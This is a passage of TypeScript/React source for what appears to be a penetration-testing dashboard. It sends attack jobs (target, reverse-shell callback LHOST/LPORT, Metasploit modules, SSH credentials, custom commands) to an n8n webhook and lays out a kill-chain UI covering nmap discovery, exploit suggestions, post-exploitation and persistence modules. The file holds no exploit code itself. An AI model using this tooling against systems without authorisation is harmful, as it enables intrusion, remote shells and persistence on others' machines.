          attack_type: mode,
          target: {
            ip: config.target_ip,
            port: parseInt(config.target_port),
            os_type: config.selected_host_os_type,
            os: config.selected_host_os,
          },
          attack_config: {
            module: moduleName,
            lhost: config.lhost,
            lport: parseInt(config.lport),
            payload: selectedExploit?.payload || undefined,
            exploit_type: selectedExploit?.exploit_type || undefined,
            options: selectedExploit?.options || undefined,
          },
          ...(mode === 'credentialed' && {
            credentials: {
              ssh_host: config.ssh_host || config.target_ip,
              ssh_user: config.ssh_user,
              ssh_password: config.ssh_password,
            },
            custom_command: config.custom_command,
          }),
          timestamp: new Date().toISOString(),
        }

        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        })

        if (response.ok) {
          const result = await response.json()
          setExecutionHistory(prev => prev.map(h =>
            h.id === executionId ? { ...h, status: 'success', output: result.output } : h
          ))
          toast.success('Attack executed via n8n')
        } else {
          throw new Error('n8n webhook also failed')
        }
      } catch (n8nError) {
        // Both methods failed
        setExecutionHistory(prev => prev.map(h =>
          h.id === executionId ? { ...h, status: 'failed' } : h
        ))

        addNotification({
          id: `notif_${Date.now()}`,
          type: 'error',
          title: 'Attack Failed',
          message: `Failed to execute ${mode} attack on ${config.target_ip}`,
          timestamp: new Date().toISOString(),
        })

        toast.error('Failed to execute attack - both direct and n8n methods failed')
      }
    } finally {
      setIsLoading(false)
      setLoadingMessage('')
    }
  }

  const suggestedExploits = getSelectedHostExploits()

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="font-display text-3xl font-bold tracking-wider text-white flex items-center gap-3">
            {mode === 'credentialed' ? (
              <KeyIcon className="w-8 h-8 text-neon-green" />
            ) : (
              <CommandLineIcon className="w-8 h-8 text-cyber-purple" />
            )}
            {mode === 'credentialed' ? 'CREDENTIALED ATTACK' : 'BLACK BOX ATTACK'}
          </h1>
          <p className="text-slate mt-1">
            {mode === 'credentialed'
              ? 'Execute authenticated penetration tests with valid credentials'
              : 'Execute unauthenticated exploitation against target systems'}
          </p>
        </div>
        <div className={`cyber-badge ${mode === 'credentialed' ? 'cyber-badge-green' : 'cyber-badge-purple'}`}>
          {mode.toUpperCase()}
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Configuration Panel */}
        <div className="lg:col-span-2 space-y-6">

          {/* ‚îÄ‚îÄ NETWORK DISCOVERY (Blackbox only) ‚îÄ‚îÄ */}
          {mode === 'blackbox' && (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="cyber-card rounded-2xl p-6 border-cyber-purple/40"
            >
              <h2 className="font-display text-lg font-semibold tracking-wider text-white mb-4 flex items-center gap-2">
                <GlobeAltIcon className="w-5 h-5 text-cyber-cyan" />
                NETWORK DISCOVERY
                <span className="ml-auto text-xs font-mono text-slate">
                  via Agent SSH
                </span>
              </h2>

              <p className="text-sm text-slate mb-4">
                Scan the network from the Kali agent. Discovers live hosts, OS types, services, and automatically suggests exploits using nmap scripts + searchsploit.
              </p>

              {/* Timing Selector */}
              <div className="mb-4">
                <label className="block text-xs font-display tracking-wider text-slate mb-2 flex items-center gap-1">
                  <BoltIcon className="w-3.5 h-3.5" />
                  SCAN SPEED / TIMING TEMPLATE
                </label>
                <div className="grid grid-cols-5 gap-2">
                  {TIMING_OPTIONS.map((opt) => (
                    <button
                      key={opt.value}
                      onClick={() => setTiming(opt.value)}
                      className={`
                        p-2 rounded-lg border text-center transition-all duration-200 group
                        ${timing === opt.value
                          ? 'border-cyber-purple bg-cyber-purple/15 shadow-[0_0_15px_rgba(168,85,247,0.2)]'
                          : 'border-slate/20 bg-graphite/30 hover:border-slate/40'
                        }
                      `}
                    >
                      <span className={`font-mono font-bold text-sm ${timing === opt.value ? opt.color : 'text-white/70'}`}>
                        {opt.value}
                      </span>
                      <p className="text-[9px] text-slate mt-0.5 leading-tight">{opt.desc}</p>
                    </button>
                  ))}
                </div>
              </div>

              {/* Discovery Controls */}
              <div className="flex flex-col sm:flex-row gap-3 mb-4">
                <div className="flex-1">
                  <input
                    type="text"
                    value={networkRange}
                    onChange={(e) => setNetworkRange(e.target.value)}
                    placeholder="Network range (auto-detect if empty, e.g. 192.168.1.0/24)"
                    className="cyber-input text-sm"
                  />
                </div>
                <motion.button
                  onClick={runNetworkDiscovery}
                  disabled={isDiscoveryRunning}
                  className={`
                    px-6 py-3 rounded-xl font-display font-bold tracking-wider text-sm
                    flex items-center justify-center gap-2 transition-all duration-300 min-w-[220px]
                    ${isDiscoveryRunning
                      ? 'bg-graphite/50 border border-slate/30 text-slate cursor-wait'
                      : 'bg-gradient-to-r from-cyber-cyan to-cyber-blue text-white border border-cyber-cyan/30 hover:shadow-[0_0_30px_rgba(34,211,238,0.3)]'
                    }
                  `}
                  whileHover={!isDiscoveryRunning ? { scale: 1.02 } : {}}
                  whileTap={!isDiscoveryRunning ? { scale: 0.98 } : {}}
                >
                  {isDiscoveryRunning ? (
                    <>
                      <ArrowPathIcon className="w-5 h-5 animate-spin" />
                      SCANNING ({timing})...
                    </>
                  ) : (
                    <>
                      <SignalIcon className="w-5 h-5" />
                      DISCOVER NETWORK
                    </>
                  )}
                </motion.button>
              </div>

              {/* Agent status hint */}
              {!agentConfig.ssh_host && (
                <div className="p-3 bg-neon-yellow/5 border border-neon-yellow/20 rounded-lg mb-4">
                  <p className="text-xs text-neon-yellow">
                    ‚ö†Ô∏è Agent not configured. Go to <span className="font-bold">Settings ‚Üí Agent Configuration</span> to set up SSH credentials for your Kali machine.
                  </p>
                </div>
              )}

              {/* Discovery Results */}
              {networkDiscoveryResult && (
                <div className="mt-4">
                  {/* Network Info Banner */}
                  <div className="flex flex-wrap items-center gap-3 mb-4 p-3 bg-graphite/50 rounded-lg border border-slate/20">
                    <div className="flex items-center gap-2">
                      <WifiIcon className="w-4 h-4 text-cyber-cyan" />
                      <span className="text-xs font-mono text-slate">
                        Agent: <span className="text-white">{networkDiscoveryResult.network_info?.local_ip}</span>
                      </span>
                    </div>
                    <span className="text-slate/40">|</span>
                    <span className="text-xs font-mono text-slate">
                      Range: <span className="text-white">{networkDiscoveryResult.network_info?.network_range}</span>
                    </span>
                    <span className="text-slate/40">|</span>
                    <span className="text-xs font-mono text-slate">
                      Timing: <span className="text-white">{networkDiscoveryResult.scan_config?.timing || 'T4'}</span>
                    </span>
                    <span className="ml-auto text-xs font-mono text-cyber-cyan">
                      {networkDiscoveryResult.summary?.total_hosts} host(s) ‚Ä¢ {networkDiscoveryResult.summary?.total_open_ports} port(s) ‚Ä¢ {networkDiscoveryResult.summary?.total_suggested_exploits || 0} exploit(s)
                    </span>
                  </div>

                  {/* Host Cards */}
                  <div className="space-y-3 max-h-[500px] overflow-y-auto pr-1">
                    {networkDiscoveryResult.discovered_hosts.map((host) => (
                      <motion.div
                        key={host.ip}
                        initial={{ opacity: 0, x: -10 }}
                        animate={{ opacity: 1, x: 0 }}
                        className={`
                          rounded-xl border transition-all duration-200 overflow-hidden
                          ${config.target_ip === host.ip
                            ? 'border-cyber-purple bg-cyber-purple/5 shadow-[0_0_20px_rgba(168,85,247,0.15)]'
                            : 'border-slate/20 bg-graphite/30 hover:border-slate/40'
                          }
                        `}
                      >
                        {/* Host Header */}
                        <div
                          className="flex items-center gap-3 p-4 cursor-pointer"
                          onClick={() => setExpandedHost(expandedHost === host.ip ? null : host.ip)}
                        >
                          <div className="text-2xl">{getOsIcon(host.os_type)}</div>
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2">
                              <span className="font-mono font-bold text-white">{host.ip}</span>
                              {host.hostnames && host.hostnames.length > 0 && (
                                <span className="text-xs text-slate truncate">({host.hostnames[0]})</span>
                              )}
                            </div>
                            <div className="flex items-center gap-2 mt-1">
                              <span className={`inline-flex items-center px-2 py-0.5 rounded text-[10px] font-display font-semibold uppercase tracking-wider border ${getOsBadgeClass(host.os_type)}`}>
                                {host.os_type}
                              </span>
                              <span className="text-[10px] text-slate truncate max-w-[200px]">
                                {host.os}
                              </span>
                              {host.os_accuracy > 0 && (
                                <span className="text-[10px] text-slate">
                                  ({host.os_accuracy}%)
                                </span>
                              )}
                            </div>
                          </div>

                          <div className="flex items-center gap-2">
                            <span className="text-xs font-mono text-cyber-cyan">
                              {host.ports.length} port{host.ports.length !== 1 ? 's' : ''}
                            </span>
                            {(host.suggested_exploits?.length || 0) > 0 && (
                              <span className="text-xs font-mono text-neon-yellow flex items-center gap-1">
                                <ShieldExclamationIcon className="w-3.5 h-3.5" />
                                {host.suggested_exploits.length}
                              </span>
                            )}

                            <motion.button
                              onClick={(e) => {
                                e.stopPropagation()
                                selectTarget(host)
                              }}
                              className="px-3 py-1.5 rounded-lg bg-cyber-purple/20 border border-cyber-purple/30 text-cyber-purple text-xs font-display font-semibold tracking-wider hover:bg-cyber-purple/30 transition-colors"
                              whileHover={{ scale: 1.05 }}
                              whileTap={{ scale: 0.95 }}
                            >
                              SELECT
                            </motion.button>

                            {expandedHost === host.ip ? (
                              <ChevronUpIcon className="w-4 h-4 text-slate" />
                            ) : (
                              <ChevronDownIcon className="w-4 h-4 text-slate" />
                            )}
                          </div>
                        </div>

                        {/* Expanded: Ports + Scripts + Exploits */}
                        <AnimatePresence>
                          {expandedHost === host.ip && (
                            <motion.div
                              initial={{ height: 0, opacity: 0 }}
                              animate={{ height: 'auto', opacity: 1 }}
                              exit={{ height: 0, opacity: 0 }}
                              transition={{ duration: 0.2 }}
                              className="border-t border-slate/10"
                            >
                              <div className="p-4 bg-void/50">
                                {/* Ports Table */}
                                <table className="w-full text-xs">
                                  <thead>
                                    <tr className="text-slate font-display tracking-wider uppercase">
                                      <th className="text-left pb-2">Port</th>
                                      <th className="text-left pb-2">Service</th>
                                      <th className="text-left pb-2">Product / Version</th>
                                      <th className="text-left pb-2">State</th>
                                    </tr>
                                  </thead>
                                  <tbody>
                                    {host.ports.map((port) => (
                                      <tr
                                        key={`${host.ip}-${port.port}`}
                                        className="border-t border-slate/10 hover:bg-graphite/30 cursor-pointer transition-colors"
                                        onClick={(e) => {
                                          e.stopPropagation()
                                          selectPort(host, port.port)
                                        }}
                                      >
                                        <td className="py-2 font-mono text-cyber-cyan">{port.port}/{port.protocol}</td>
                                        <td className="py-2 text-white">{port.service}</td>
                                        <td className="py-2 text-slate">
                                          {[port.product, port.version].filter(Boolean).join(' ') || '‚Äî'}
                                        </td>
                                        <td className="py-2">
                                          <span className="inline-flex items-center gap-1">
                                            <span className="w-1.5 h-1.5 rounded-full bg-neon-green" />
                                            <span className="text-neon-green">{port.state}</span>
                                          </span>
                                        </td>
                                      </tr>
                                    ))}
                                  </tbody>
                                </table>

                                {/* Exploit suggestions inline preview */}
                                {host.suggested_exploits && host.suggested_exploits.length > 0 && (
                                  <div className="mt-3 pt-3 border-t border-slate/10">
                                    <p className="text-[10px] font-display tracking-wider text-neon-yellow uppercase mb-2 flex items-center gap-1">
                                      <ShieldExclamationIcon className="w-3 h-3" />
                                      {host.suggested_exploits.length} EXPLOIT SUGGESTION(S)
                                    </p>
                                    <div className="flex flex-wrap gap-1.5">
                                      {host.suggested_exploits.slice(0, 6).map((exp) => (
                                        <span
                                          key={exp.id}
                                          className={`inline-flex items-center gap-1 px-2 py-0.5 rounded text-[9px] font-mono border ${getConfidenceBadge(exp.confidence)}`}
                                          title={exp.description}
                                        >
                                          {exp.confidence === 'high' ? 'üéØ' : exp.confidence === 'medium' ? 'üîç' : 'üìã'}
                                          {exp.name.length > 40 ? exp.name.substring(0, 40) + '...' : exp.name}
                                        </span>
                                      ))}
                                      {host.suggested_exploits.length > 6 && (
                                        <span className="text-[9px] text-slate">+{host.suggested_exploits.length - 6} more</span>
                                      )}
                                    </div>
                                  </div>
                                )}

                                {host.mac_address && (
                                  <div className="mt-3 pt-2 border-t border-slate/10 text-[10px] text-slate font-mono">
                                    MAC: {host.mac_address} {host.vendor ? `(${host.vendor})` : ''}
                                  </div>
                                )}
                              </div>
                            </motion.div>
                          )}
                        </AnimatePresence>
                      </motion.div>
                    ))}

                    {networkDiscoveryResult.discovered_hosts.length === 0 && networkDiscoveryResult.success && (
                      <div className="text-center py-6 text-slate">
                        <ComputerDesktopIcon className="w-10 h-10 mx-auto mb-2 opacity-40" />
                        <p className="text-sm">No hosts discovered in this network range</p>
                      </div>
                    )}
                  </div>
                </div>
              )}
            </motion.div>
          )}

          {/* ‚îÄ‚îÄ TARGET CONFIGURATION (Blackbox only) ‚îÄ‚îÄ */}
          {mode === 'blackbox' && (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="cyber-card rounded-2xl p-6"
            >
              <h2 className="font-display text-lg font-semibold tracking-wider text-white mb-4 flex items-center gap-2">
                <ServerIcon className="w-5 h-5 text-cyber-purple" />
                TARGET CONFIGURATION
                {config.selected_host_os_type !== 'unknown' && (
                  <span className={`ml-auto inline-flex items-center gap-1 px-2 py-0.5 rounded text-[10px] font-mono border ${getOsBadgeClass(config.selected_host_os_type)}`}>
                    {getOsIcon(config.selected_host_os_type)} {config.selected_host_os_type.toUpperCase()}
                  </span>
                )}
              </h2>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-display tracking-wider text-slate mb-2">
                    TARGET IP
                  </label>
                  <input
                    type="text"
                    value={config.target_ip}
                    onChange={(e) => handleInputChange('target_ip', e.target.value)}
                    placeholder="192.168.1.100"
                    className="cyber-input"
                  />
                </div>
                <div>
                  <label className="block text-sm font-display tracking-wider text-slate mb-2">
                    TARGET PORT
                  </label>
                  <input
                    type="text"
                    value={config.target_port}
                    onChange={(e) => handleInputChange('target_port', e.target.value)}
                    placeholder="445"
                    className="cyber-input"
                  />
                </div>
                <div>
                  <label className="block text-sm font-display tracking-wider text-slate mb-2">
                    LHOST (Callback)
                  </label>
                  <input
                    type="text"
                    value={config.lhost}
                    onChange={(e) => handleInputChange('lhost', e.target.value)}
                    placeholder="Your IP for reverse shell"
                    className="cyber-input"
                  />
                </div>
                <div>
                  <label className="block text-sm font-display tracking-wider text-slate mb-2">
                    LPORT (Callback)
                  </label>
                  <input
                    type="text"
                    value={config.lport}
                    onChange={(e) => handleInputChange('lport', e.target.value)}
                    placeholder="4444"
                    className="cyber-input"
                  />
                </div>
              </div>
            </motion.div>
          )}

          {/* ‚îÄ‚îÄ CREDENTIALS (Credentialed only ‚Äî this IS the target config) ‚îÄ‚îÄ */}
          {mode === 'credentialed' && (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="cyber-card rounded-2xl p-6 border-neon-green/20"
            >
              <h2 className="font-display text-lg font-semibold tracking-wider text-white mb-2 flex items-center gap-2">
                <KeyIcon className="w-5 h-5 text-neon-green" />
                TARGET &amp; CREDENTIALS
              </h2>
              <p className="text-xs text-slate mb-4">
                SSH into the target machine to execute Atomic Red Team tests. All commands run directly on this host.
              </p>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div>
                  <label className="block text-sm font-display tracking-wider text-slate mb-2 flex items-center gap-1.5">
                    <ServerIcon className="w-3.5 h-3.5 text-neon-green" />
                    SSH HOST (Target)
                  </label>
                  <input
                    type="text"
                    value={credentialedConfig.ssh_host}
                    onChange={(e) => updateCredentialedConfig({ ssh_host: e.target.value })}
                    placeholder="192.168.1.100"
                    className="cyber-input"
                  />
                </div>
                <div>
                  <label className="block text-sm font-display tracking-wider text-slate mb-2">SSH USER</label>
                  <input
                    type="text"
                    value={credentialedConfig.ssh_user}
                    onChange={(e) => updateCredentialedConfig({ ssh_user: e.target.value })}
                    placeholder="root"
                    className="cyber-input"
                  />
                </div>
                <div>
                  <label className="block text-sm font-display tracking-wider text-slate mb-2">SSH PASSWORD</label>
                  <input
                    type="password"
                    value={credentialedConfig.ssh_password}
                    onChange={(e) => updateCredentialedConfig({ ssh_password: e.target.value })}
                    placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢"
                    className="cyber-input"
                  />
                </div>
              </div>

              {/* Connection status indicator */}
              {credentialedConfig.ssh_host && (
                <div className="mt-3 flex items-center gap-2 text-xs">
                  <span className={`w-2 h-2 rounded-full ${credentialedConfig.ssh_host && credentialedConfig.ssh_user && credentialedConfig.ssh_password ? 'bg-neon-green animate-pulse' : 'bg-neon-yellow'}`} />
                  <span className="text-slate font-mono">
                    {credentialedConfig.ssh_user}@{credentialedConfig.ssh_host}
                    {!credentialedConfig.ssh_password && ' ‚Äî password required'}
                  </span>
                </div>
              )}

              <div className="mt-4">
                <label className="block text-sm font-display tracking-wider text-slate mb-2 flex items-center gap-1.5">
                  <CodeBracketIcon className="w-3.5 h-3.5 text-cyber-cyan" />
                  CUSTOM COMMAND
                </label>
                <div className="flex gap-2">
                  <div className="flex-1">
                    <textarea
                      value={credentialedConfig.custom_command}
                      onChange={(e) => updateCredentialedConfig({ custom_command: e.target.value })}
                      onKeyDown={(e) => { if (e.key === 'Enter' && !e.shiftKey && !isCredCmdRunning) { e.preventDefault(); executeCredCustomCommand() } }}
                      placeholder="Enter a command to execute on the target via SSH..."
                      rows={2}
                      className="cyber-input font-mono text-sm"
                      disabled={isCredCmdRunning}
                    />
                  </div>
                  <div className="flex flex-col gap-1.5">
                    <motion.button
                      onClick={executeCredCustomCommand}
                      disabled={isCredCmdRunning || !credentialedConfig.custom_command?.trim()}
                      className={`px-4 py-2 rounded-xl font-display font-bold text-xs tracking-wider flex items-center gap-1.5 transition-all h-full
                        ${isCredCmdRunning
                          ? 'bg-graphite/50 border border-slate/30 text-slate'
                          : 'bg-neon-green/20 border border-neon-green/30 text-neon-green hover:bg-neon-green/30'
                        }
                      `}
                      whileHover={!isCredCmdRunning ? { scale: 1.03 } : {}}
                      whileTap={!isCredCmdRunning ? { scale: 0.97 } : {}}
                    >
                      {isCredCmdRunning ? (
                        <ArrowPathIcon className="w-4 h-4 animate-spin" />
                      ) : (
                        <PlayIcon className="w-4 h-4" />
                      )}
                      {isCredCmdRunning ? 'RUNNING' : 'RUN'}
                    </motion.button>
                  </div>
                </div>

                {/* Terminal Output for Credentialed Custom Command */}
                {(credCmdOutput || isCredCmdRunning) && (
                  <div className="mt-3">
                    <div className="flex items-center justify-between mb-1.5">
                      <span className="text-xs text-slate font-display tracking-wider flex items-center gap-1.5">
                        <CommandLineIcon className="w-3.5 h-3.5 text-cyber-cyan" />
                        OUTPUT
                      </span>
                      <button
                        onClick={() => setCredCmdOutput('')}
                        className="px-2 py-0.5 rounded text-[10px] border border-slate/20 text-slate hover:text-white hover:border-slate/40 transition-colors flex items-center gap-1"
                        title="Clear output"
                      >
                        <TrashIcon className="w-3 h-3" />
                        CLEAR
                      </button>
                    </div>
                    <div
                      ref={credTerminalRef}
                      className="bg-void border border-slate/20 rounded-lg p-3 font-mono text-xs text-neon-green h-[200px] overflow-y-auto whitespace-pre-wrap"
                    >
                      {credCmdOutput}
                      {isCredCmdRunning && (
                        <span className="text-cyber-cyan animate-pulse">‚è≥ Executing...</span>
                      )}
                    </div>
                  </div>
                )}
              </div>
            </motion.div>
          )}

          {/* ‚îÄ‚îÄ ATTACK MODULE ‚îÄ‚îÄ */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.2 }}
            className="cyber-card rounded-2xl p-6"
          >
            <h2 className="font-display text-lg font-semibold tracking-wider text-white mb-4 flex items-center gap-2">
              <CommandLineIcon className="w-5 h-5 text-cyber-magenta" />
              ATTACK MODULE
            </h2>

            {/* ‚îÄ‚îÄ Tab Navigation (blackbox mode with discovery results) ‚îÄ‚îÄ */}
            {mode === 'blackbox' ? (
              <>
                <div className="flex gap-1 mb-4 p-1 bg-graphite/50 rounded-lg border border-slate/20">
                  <button
                    onClick={() => setAttackTab('killchain')}
                    className={`flex-1 px-3 py-2 rounded-md text-xs font-display font-semibold tracking-wider transition-all flex items-center justify-center gap-1.5 ${
                      attackTab === 'killchain'
                        ? 'bg-gradient-to-r from-cyber-purple/30 to-cyber-magenta/30 text-white border border-cyber-purple/50'
                        : 'text-slate hover:text-white'
                    }`}
                  >
                    <BoltIcon className="w-4 h-4" />
                    KILL CHAIN
                  </button>
                  <button
                    onClick={() => setAttackTab('suggested')}
                    className={`flex-1 px-3 py-2 rounded-md text-xs font-display font-semibold tracking-wider transition-all flex items-center justify-center gap-1.5 ${
                      attackTab === 'suggested'
                        ? 'bg-cyber-purple/20 text-cyber-purple border border-cyber-purple/30'
                        : 'text-slate hover:text-white'
                    }`}
                  >
                    <ShieldExclamationIcon className="w-4 h-4" />
                    SUGGESTED ATTACKS
                    {suggestedExploits.length > 0 && (
                      <span className="px-1.5 py-0.5 rounded bg-cyber-purple/30 text-[10px]">{suggestedExploits.length}</span>
                    )}
                  </button>
                  <button
                    onClick={() => setAttackTab('custom')}
                    className={`flex-1 px-3 py-2 rounded-md text-xs font-display font-semibold tracking-wider transition-all flex items-center justify-center gap-1.5 ${
                      attackTab === 'custom'
                        ? 'bg-cyber-cyan/20 text-cyber-cyan border border-cyber-cyan/30'
                        : 'text-slate hover:text-white'
                    }`}
                  >
                    <CpuChipIcon className="w-4 h-4" />
                    CUSTOM COMMAND
                  </button>
                  <button
                    onClick={() => setAttackTab('metasploit')}
                    className={`flex-1 px-3 py-2 rounded-md text-xs font-display font-semibold tracking-wider transition-all flex items-center justify-center gap-1.5 ${
                      attackTab === 'metasploit'
                        ? 'bg-neon-red/20 text-neon-red border border-neon-red/30'
                        : 'text-slate hover:text-white'
                    }`}
                  >
                    <AdjustmentsHorizontalIcon className="w-4 h-4" />
                    MANUAL METASPLOIT
                  </button>
                </div>

                {/* ‚îÄ‚îÄ TAB: Kill Chain ‚îÄ‚îÄ */}
                {attackTab === 'killchain' && (
                  <div className="space-y-4">
                    {/* Stage 1: Enumeration */}
                    <div className="bg-graphite/30 rounded-xl p-4 border border-cyber-cyan/20">
                      <div className="flex items-center gap-2 mb-3">
                        <div className="w-8 h-8 rounded-full bg-cyber-cyan/20 border border-cyber-cyan/40 flex items-center justify-center text-cyber-cyan font-bold text-sm">1</div>
                        <h3 className="font-display font-semibold text-white tracking-wider">ENUMERATION</h3>
                        <span className="ml-auto text-xs text-slate">
                          {killChain.enumeration.selectedHosts.length} host(s) selected
                        </span>
                      </div>
                      <p className="text-xs text-slate mb-3">Select hosts from network discovery results</p>
                      {networkDiscoveryResult?.discovered_hosts && networkDiscoveryResult.discovered_hosts.length > 0 ? (
                        <div className="space-y-2 max-h-[200px] overflow-y-auto">
                          {networkDiscoveryResult.discovered_hosts.map((host) => {
                            const isSelected = killChain.enumeration.selectedHosts.some(h => h.ip === host.ip)
                            return (
                              <div
                                key={host.ip}
                                onClick={() => {
                                  if (isSelected) {
                                    setKillChain(prev => ({
                                      ...prev,
                                      enumeration: {
                                        selectedHosts: prev.enumeration.selectedHosts.filter(h => h.ip !== host.ip)
                                      }
                                    }))
                                  } else {
                                    const newHost = {
                                      ip: host.ip,
                                      os: host.os,
                                      os_type: host.os_type,
                                      ports: host.ports.map(p => p.port)
                                    }
                                    setKillChain(prev => {
                                      const newHosts = [...prev.enumeration.selectedHosts, newHost]
                                      // Auto-detect OS from first selected host
                                      const detectedOsType = newHosts.length > 0 && newHosts[0].os_type !== 'unknown' 
                                        ? newHosts[0].os_type 
                                        : prev.postExploitation.osType
                                      
                                      return {
                                        ...prev,
                                        enumeration: {
                                          selectedHosts: newHosts
                                        },
                                        postExploitation: {
                                          ...prev.postExploitation,
                                          osType: detectedOsType
                                        }
                                      }
                                    })
                                  }
                                }}
                                className={`p-2 rounded-lg border cursor-pointer transition-all ${
                                  isSelected
                                    ? 'border-cyber-cyan bg-cyber-cyan/10'
                                    : 'border-slate/20 bg-graphite/50 hover:border-slate/40'
                                }`}
                              >
                                <div className="flex items-center gap-2">
                                  <span className="font-mono text-sm text-white">{host.ip}</span>
                                  <span className={`text-xs px-1.5 py-0.5 rounded ${getOsBadgeClass(host.os_type)}`}>
                                    {host.os_type}
                                  </span>
                                  <span className="text-xs text-slate ml-auto">{host.ports.length} ports</span>
                                </div>
                              </div>
                            )
                          })}
                        </div>
                      ) : (
                        <div className="text-center py-4 text-slate text-sm">
                          Run Network Discovery first to see hosts
                        </div>
                      )}
                    </div>

                    {/* Stage 2: Weaponization */}
                    <div className="bg-graphite/30 rounded-xl p-4 border border-cyber-purple/20">
                      <div className="flex items-center gap-2 mb-3">
                        <div className="w-8 h-8 rounded-full bg-cyber-purple/20 border border-cyber-purple/40 flex items-center justify-center text-cyber-purple font-bold text-sm">2</div>
                        <h3 className="font-display font-semibold text-white tracking-wider">WEAPONIZATION</h3>
                        <span className="ml-auto text-xs text-slate">
                          {killChain.weaponization.selectedAttacks.length} attack(s) selected
                        </span>
                      </div>
                      <p className="text-xs text-slate mb-3">Select attacks from suggested exploits</p>
                      {suggestedExploits.length > 0 ? (
                        <div className="space-y-2 max-h-[200px] overflow-y-auto">
                          {suggestedExploits.map((exploit) => {
                            const isSelected = killChain.weaponization.selectedAttacks.some(a => a.id === exploit.id)
                            return (
                              <div
                                key={exploit.id}
                                onClick={() => {
                                  if (isSelected) {
                                    setKillChain(prev => ({
                                      ...prev,
                                      weaponization: {
                                        selectedAttacks: prev.weaponization.selectedAttacks.filter(a => a.id !== exploit.id)
                                      }
                                    }))
                                  } else {
                                    setKillChain(prev => ({
                                      ...prev,
                                      weaponization: {
                                        selectedAttacks: [...prev.weaponization.selectedAttacks, exploit]
                                      }
                                    }))
                                  }
                                }}
                                className={`p-2 rounded-lg border cursor-pointer transition-all ${
                                  isSelected
                                    ? 'border-cyber-purple bg-cyber-purple/10'
                                    : 'border-slate/20 bg-graphite/50 hover:border-slate/40'
                                }`}
                              >
                                <div className="flex items-center gap-2">
                                  <span className="text-sm text-white font-semibold truncate flex-1">{exploit.name}</span>
                                  <span className="text-xs text-cyber-cyan font-mono font-bold">PORT: {exploit.port}</span>
                                </div>
                                {isSelected && killChain.enumeration.selectedHosts.length > 0 && (
                                  <div className="mt-1 text-xs text-slate/60">
                                    Target: {killChain.enumeration.selectedHosts[0].ip}:{exploit.port}
                                  </div>
                                )}
                              </div>
                            )
                          })}
                        </div>
                      ) : (
                        <div className="text-center py-4 text-slate text-sm">
                          No suggested exploits available. Run network discovery and select a host.
                        </div>
                      )}
                    </div>

                    {/* Stage 3: Post Exploitation */}
                    <div className="bg-graphite/30 rounded-xl p-4 border border-neon-red/20">
                      <div className="flex items-center gap-2 mb-3">
                        <div className="w-8 h-8 rounded-full bg-neon-red/20 border border-neon-red/40 flex items-center justify-center text-neon-red font-bold text-sm">3</div>
                        <h3 className="font-display font-semibold text-white tracking-wider">POST EXPLOITATION</h3>
                      </div>
                      <div className="mb-3">
                        <label className="block text-xs text-slate mb-2">Target OS Type (Auto-detected from Enumeration)</label>
                        <div className="flex items-center gap-2">
                          <input
                            type="text"
                            value={killChain.enumeration.selectedHosts.length > 0 
                              ? killChain.enumeration.selectedHosts[0].os_type !== 'unknown' 
                                ? killChain.enumeration.selectedHosts[0].os_type.toUpperCase() 
                                : 'UNKNOWN'
                              : 'No hosts selected'}
                            readOnly
                            className="cyber-input text-sm bg-graphite/50"
                          />
                          {killChain.enumeration.selectedHosts.length > 0 && (
                            <span className="text-xs text-slate">
                              from {killChain.enumeration.selectedHosts[0].ip}
                            </span>
                          )}
                        </div>
                        {killChain.enumeration.selectedHosts.length > 0 && (
                          <p className="text-xs text-slate/60 mt-1">
                            OS detected from selected enumeration hosts
                          </p>
                        )}
                      </div>
                      {(killChain.postExploitation.osType !== 'unknown' || killChain.enumeration.selectedHosts.length > 0) && (
                        <>
                          <p className="text-xs text-slate mb-2">Post-Exploitation Modules</p>
                          <div className="space-y-2 max-h-[150px] overflow-y-auto mb-3">
                            {((() => {
                              const osType = killChain.postExploitation.osType !== 'unknown' 
                                ? killChain.postExploitation.osType 
                                : killChain.enumeration.selectedHosts.length > 0 
                                  ? killChain.enumeration.selectedHosts[0].os_type 
                                  : 'unknown'
                              return POST_EXPLOITATION_MODULES[osType as 'linux' | 'windows'] || []
                            })()).map((mod) => {
                              const isSelected = killChain.postExploitation.selectedModules.some(m => m.module === mod.module)
                              return (
                                <div
                                  key={mod.module}
                                  onClick={() => {
                                    if (isSelected) {
                                      setKillChain(prev => ({
                                        ...prev,
                                        postExploitation: {
                                          ...prev.postExploitation,
                                          selectedModules: prev.postExploitation.selectedModules.filter(m => m.module !== mod.module)
                                        }
                                      }))
                                    } else {
                                      setKillChain(prev => ({
                                        ...prev,
                                        postExploitation: {
                                          ...prev.postExploitation,
                                          selectedModules: [...prev.postExploitation.selectedModules, mod]
                                        }
                                      }))
                                    }
                                  }}
                                  className={`p-2 rounded-lg border cursor-pointer transition-all ${
                                    isSelected
                                      ? 'border-neon-red bg-neon-red/10'
                                      : 'border-slate/20 bg-graphite/50 hover:border-slate/40'
                                  }`}
                                >
                                  <div className="flex items-center gap-2">
                                    <span className="text-sm text-white">{mod.name}</span>
                                    <span className="text-xs text-slate font-mono ml-auto">{mod.module}</span>
                                  </div>
                                </div>
                              )
                            })}
                          </div>
                          <div className="border-t border-slate/20 pt-3">
                            <p className="text-xs text-slate mb-2">Persistence Attacks</p>
                            <div className="space-y-2 max-h-[120px] overflow-y-auto">
                              {((() => {
                                const osType = killChain.postExploitation.osType !== 'unknown' 
                                  ? killChain.postExploitation.osType 
                                  : killChain.enumeration.selectedHosts.length > 0 
                                    ? killChain.enumeration.selectedHosts[0].os_type 
                                    : 'unknown'
                                return PERSISTENCE_MODULES[osType as 'linux' | 'windows'] || []
